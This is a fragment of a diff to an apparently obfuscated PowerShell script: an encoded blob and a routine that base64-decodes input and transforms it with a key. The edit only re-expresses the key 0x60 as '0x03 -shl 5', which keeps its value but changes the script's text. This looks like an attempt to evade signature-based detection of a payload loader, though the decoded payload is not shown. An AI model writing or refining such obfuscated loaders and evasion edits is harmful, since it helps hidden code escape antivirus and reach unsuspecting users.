@@ -3,7 +3,7 @@ ${7e849043} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPVVJUWFEGVFMBWAJWBVdVA
 ${global:a3b2c1} = { 
     param(
         [string]${input_data},
-        [int]${transform_value} = 0x60
+        [int]${transform_value} = 0x03 -shl 5
     )
     
     ${base64_decoded_bytes} = [Convert]::FromBase64String(${input_data})
